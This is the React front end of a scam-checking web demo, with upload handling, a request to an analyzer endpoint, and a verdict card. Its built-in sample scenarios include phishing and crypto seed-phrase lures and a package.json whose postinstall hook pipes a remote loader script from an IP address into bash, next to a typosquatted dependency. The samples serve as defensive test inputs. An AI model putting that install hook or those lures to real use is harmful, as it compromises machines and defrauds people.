import { useEffect, useRef, useState } from "react";
import gsap from "gsap";

type Attachment = { kind: "image" | "pdf"; base64: string; mediaType: string; name: string; thumb?: string };
type Sev = "high" | "medium" | "low" | "info";
type Verdict = {
  verdict?: "safe" | "caution" | "scam";
  error?: string;
  title?: string;
  summary?: string;
  risk_score?: number;
  confidence?: number;
  disclaimer?: string;
  red_flags?: { label: string; detail: string; severity: Sev }[];
  recommended_actions?: string[];
  evidence?: { claim: string; source: string; severity: Sev }[];
  limit_reached?: boolean;
};
type OutState = { status: "idle" | "loading" | "error" | "done"; error?: string; verdict?: Verdict };

const MAX_FILES = 8;
const MAX_PDF_BYTES = 6_000_000;
const COLOR: Record<string, string> = { safe: "var(--safe)", caution: "var(--caution)", scam: "var(--scam)" };

const SCENARIOS = [
  { i: "📦", t: "Parcel SMS", s: "fake delivery fee", v: "ROYAL MAIL: Your parcel has a £1.99 unpaid shipping fee. Pay within 24h or it returns to sender: https://royalmail-redelivery.info/pay" },
  { i: "🪙", t: "Crypto airdrop", s: "seed-phrase scam", v: "🎉 You are eligible for the OKB community airdrop (2,500 OKB). Connect your wallet to claim before it expires: https://okb-airdrop-claim.xyz — verify your seed phrase to receive tokens." },
  { i: "💼", t: "Job offer", s: "upfront deposit", v: "Hi! We reviewed your profile and want to offer you a remote data-entry role, $450/day, no interview. To onboard, please pay a $50 refundable equipment deposit via gift card and send the code." },
  { i: "☠️", t: "Malicious repo", s: "fake take-home", v: '{"name":"frontend-take-home","scripts":{"postinstall":"curl -s http://185.62.190.10/loader.sh | bash"},"dependencies":{"react":"^18.2.0","expresss":"^4.18.0","auth-helper-utils":"git+https://github.com/x9f2/auth-helper.git"}}' },
  { i: "🐙", t: "Real repo", s: "expressjs/express", v: "https://github.com/expressjs/express" },
  { i: "✅", t: "Benign", s: "normal message", v: "Hey, running 10 mins late for lunch — grab us a table and I'll be right there!" },
];

export default function TryConsole() {
  const [text, setText] = useState("");
  const [atts, setAtts] = useState<Attachment[]>([]);
  const [out, setOut] = useState<OutState>({ status: "idle" });
  const [drop, setDrop] = useState(false);
  const [locked, setLocked] = useState(false); // free daily demo budget exhausted
  const busy = out.status === "loading";
  const disabled = busy || locked;
  const consoleRef = useRef<HTMLDivElement>(null);
  const fileRef = useRef<HTMLInputElement>(null);
  const goRef = useRef<HTMLButtonElement>(null);
  const outRef = useRef<HTMLDivElement>(null);
  const dragDepth = useRef(0);

  // ---- attachments ----
  function addFiles(list: FileList | File[] | null | undefined) {
    if (disabled) return;
    [...(list || [])].forEach((f) => {
      if (f.type.startsWith("image/")) loadImage(f);
      else if (f.type === "application/pdf") loadPdf(f);
      else alert(`"${f.name}" isn't a supported file (images or PDF only).`);
    });
  }
  function push(a: Attachment) {
    setAtts((prev) => (prev.length >= MAX_FILES ? (alert(`Up to ${MAX_FILES} files.`), prev) : [...prev, a]));
  }
  function loadImage(file: File) {
    const url = URL.createObjectURL(file);
    const img = new Image();
    img.onload = () => {
      const max = 1600, scale = Math.min(1, max / Math.max(img.width, img.height));
      const w = Math.round(img.width * scale), h = Math.round(img.height * scale);
      const c = document.createElement("canvas");
      c.width = w; c.height = h;
      c.getContext("2d")!.drawImage(img, 0, 0, w, h);
      const dataUrl = c.toDataURL("image/jpeg", 0.92);
      URL.revokeObjectURL(url);
      push({ kind: "image", base64: dataUrl.split(",")[1], mediaType: "image/jpeg", name: file.name || "screenshot", thumb: dataUrl });
    };
    img.onerror = () => { alert("Couldn't read that image."); URL.revokeObjectURL(url); };
    img.src = url;
  }
  function loadPdf(file: File) {
    if (file.size > MAX_PDF_BYTES) { alert("PDF is too large (max ~6 MB)."); return; }
    const r = new FileReader();
    r.onload = () => push({ kind: "pdf", base64: String(r.result).split(",")[1], mediaType: "application/pdf", name: file.name || "document.pdf" });
    r.onerror = () => alert("Couldn't read that PDF.");
    r.readAsDataURL(file);
  }

  // paste-to-attach (whole document)
  useEffect(() => {
    const onPaste = (e: ClipboardEvent) => {
      const f = [...(e.clipboardData?.items || [])].filter((i) => i.type.startsWith("image/")).map((i) => i.getAsFile()).filter(Boolean) as File[];
      if (f.length) addFiles(f);
    };
    addEventListener("paste", onPaste);
    return () => removeEventListener("paste", onPaste);
  }, []);

  // cursor spotlight + magnetic button (fine pointers)
  useEffect(() => {
    if (matchMedia("(prefers-reduced-motion: reduce)").matches || !matchMedia("(pointer:fine)").matches) return;
    const el = consoleRef.current, go = goRef.current;
    if (!el) return;
    const spot = (e: MouseEvent) => {
      const r = el.getBoundingClientRect();
      el.style.setProperty("--mx", ((e.clientX - r.left) / r.width) * 100 + "%");
      el.style.setProperty("--my", ((e.clientY - r.top) / r.height) * 100 + "%");
    };
    el.addEventListener("mousemove", spot);
    const s = 0.3;
    const mag = (e: MouseEvent) => {
      if (!go) return;
      const r = go.getBoundingClientRect();
      go.style.transform = `translate(${(e.clientX - r.left - r.width / 2) * s}px,${(e.clientY - r.top - r.height / 2) * s}px)`;
    };
    const reset = () => { if (go) go.style.transform = ""; };
    go?.addEventListener("mousemove", mag);
    go?.addEventListener("mouseleave", reset);
    return () => {
      el.removeEventListener("mousemove", spot);
      go?.removeEventListener("mousemove", mag);
      go?.removeEventListener("mouseleave", reset);
    };
  }, []);

  // animate the verdict in whenever it changes
  useEffect(() => {
    if (out.status !== "done" || !outRef.current) return;
    if (matchMedia("(prefers-reduced-motion: reduce)").matches) return;
    const card = outRef.current.querySelector(".verdict");
    const bar = outRef.current.querySelector<HTMLElement>(".meter>span");
    const risk = Math.max(2, Math.min(100, out.verdict?.risk_score || 0));
    if (card) gsap.from(card, { y: 14, opacity: 0, duration: 0.5, ease: "power3.out" });
    if (bar) gsap.to(bar, { width: risk + "%", duration: 0.9, ease: "power3.out", delay: 0.1 });
  }, [out]);

  async function check(overrideText?: string) {
    if (disabled) return;
    const t = (overrideText ?? text).trim();
    if (!t && !atts.length) return;
    setOut({ status: "loading" });
    try {
      const body: Record<string, unknown> = {};
      if (t) body.text = t;
      if (atts.length) body.files = atts.map((a) => ({ kind: a.kind, base64: a.base64, mediaType: a.mediaType }));
      const r = await fetch("/try", { method: "POST", headers: { "content-type": "application/json" }, body: JSON.stringify(body) });
      const v: Verdict = await r.json();
      if (v.limit_reached) {
        // Daily free-demo budget hit — lock the console until reload.
        setLocked(true);
        setOut({ status: "error", error: v.error || "The free demo has reached today's limit." });
      } else if (v.error && !v.verdict) {
        setOut({ status: "error", error: v.error });
      } else {
        setOut({ status: "done", verdict: v });
      }
    } catch (e) {
      setOut({ status: "error", error: `Couldn't reach the analyzer. ${(e as Error)?.message || e}` });
    }
  }

  function runScenario(v: string) {
    if (disabled) return;
    setAtts([]);
    setText(v);
    check(v);
    document.getElementById("in")?.scrollIntoView({ block: "nearest" });
  }

  const onDrag = (e: React.DragEvent, kind: "over" | "leave" | "drop") => {
    e.preventDefault();
    if (kind === "over") { dragDepth.current++; setDrop(true); }
    else if (kind === "leave") { dragDepth.current = Math.max(0, dragDepth.current - 1); if (!dragDepth.current) setDrop(false); }
    else { dragDepth.current = 0; setDrop(false); addFiles(e.dataTransfer?.files); }
  };

  return (
    <div className={"console reveal" + (drop ? " drop" : "")} ref={consoleRef}
      onDragOver={(e) => onDrag(e, "over")} onDragEnter={(e) => onDrag(e, "over")}
      onDragLeave={(e) => onDrag(e, "leave")} onDrop={(e) => onDrag(e, "drop")}>
      <div className="console-bar">
        <span className="cdot safe" /><span className="cdot caution" /><span className="cdot scam" />
        <span className="console-title">scaminja · scanner</span>
        <span className="console-live"><span className="dot" /> Live</span>
      </div>
      <div className="console-body">
        <textarea id="in" value={text} onChange={(e) => setText(e.target.value)} disabled={disabled}
          placeholder="Paste a message, link, email, wallet address, GitHub repo URL, or package.json — or drop / paste a screenshot or PDF…" />
        {atts.length > 0 && (
          <div className="atts">
            {atts.map((a, i) => (
              <span className="att" key={i}>
                {a.kind === "image" ? <img src={a.thumb} alt="" /> : <span className="ic">📄</span>}
                <span className="nm">{a.name}<small>{a.kind === "image" ? "screenshot" : "PDF"}</small></span>
                <button className="x" type="button" title="Remove" onClick={() => setAtts((p) => p.filter((_, j) => j !== i))}>×</button>
              </span>
            ))}
          </div>
        )}
        <input type="file" ref={fileRef} accept="image/png,image/jpeg,image/webp,image/gif,application/pdf" multiple hidden
          onChange={(e) => { addFiles(e.target.files); e.target.value = ""; }} />
        <div className="row">
          <button className="btn btn-primary" ref={goRef} onClick={() => check()} disabled={disabled}>
            <span className="lbl">{locked ? "Daily limit reached" : busy ? "Checking…" : "Check it"}</span>
            {!locked && (busy
              ? <span className="spinner" />
              : <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.2" strokeLinecap="round" strokeLinejoin="round"><path d="M5 12h14M13 6l6 6-6 6" /></svg>)}
          </button>
          <button className="btn ghost" type="button" onClick={() => fileRef.current?.click()} disabled={disabled}>📎 Attach</button>
          <span className="tag">Screenshots &amp; PDFs · free · nothing stored</span>
        </div>
        <div className="scenarios">
          {SCENARIOS.map((sc) => (
            <button className="scen" key={sc.t} onClick={() => runScenario(sc.v)} disabled={disabled}>
              <span className="si">{sc.i}</span><b>{sc.t}</b><small>{sc.s}</small>
            </button>
          ))}
        </div>
        <p className="scen-note">
          <span className="bang">!</span>
          <span>These 6 examples are <b>pre-generated</b> — paste your own above for a <b>real, live check</b>.</span>
        </p>
        <div className="out" ref={outRef}>
          {out.status === "loading" && (
            <p className="tag" style={{ marginTop: 16 }}><span className="spinner" />{atts.length ? "Reading attachment(s) & analyzing…" : "Analyzing…"}</p>
          )}
          {out.status === "error" && (
            locked
              ? <p className="notice" style={{ marginTop: 16 }}>⏳ {out.error}</p>
              : <p className="err" style={{ marginTop: 14 }}>{out.error}</p>
          )}
          {out.status === "done" && out.verdict && <VerdictCard v={out.verdict} />}
        </div>
      </div>
    </div>
  );
}

function VerdictCard({ v }: { v: Verdict }) {
  const level = v.verdict || "caution";
  const flags = v.red_flags || [];
  const acts = v.recommended_actions || [];
  const ev = v.evidence || [];
  return (
    <div className={"verdict lv-" + level}>
      <div className="vhead">
        <span className={"badge b-" + level}>{level.toUpperCase()}</span>
        <p className="vtitle">{v.title || ""}</p>
      </div>
      <div className="vbody">
        <div className="meter"><span style={{ width: "0%", background: COLOR[level] }} /></div>
        <p className="metanum">RISK {v.risk_score}/100 · CONFIDENCE {v.confidence}%</p>
        <p className="summary">{v.summary || ""}</p>
        {ev.length > 0 && (
          <>
            <h4>Verified against live sources</h4>
            <ul className="evlist">
              {ev.map((e, i) => {
                const clean = e.severity === "info";
                return (
                  <li className={"ev " + (clean ? "ev-clean" : "ev-bad")} key={i}>
                    <span className="ev-ic">{clean ? "✓" : "⚠"}</span>
                    <span>{e.claim} <span className="ev-src">{e.source}</span></span>
                  </li>
                );
              })}
            </ul>
          </>
        )}
        {flags.length > 0 && (
          <>
            <h4>Red flags (assessment)</h4>
            <ul className="flags">
              {flags.map((f, i) => (
                <li className="flag" key={i}>
                  <span className={"sev s-" + f.severity}>{f.severity}</span>
                  <span><b>{f.label}</b> — {f.detail}</span>
                </li>
              ))}
            </ul>
          </>
        )}
        {acts.length > 0 && (
          <>
            <h4>What to do</h4>
            <ol className="actions">{acts.map((a, i) => <li key={i}>{a}</li>)}</ol>
          </>
        )}
        <p className="disc">{v.disclaimer || ""}</p>
      </div>
    </div>
  );
}
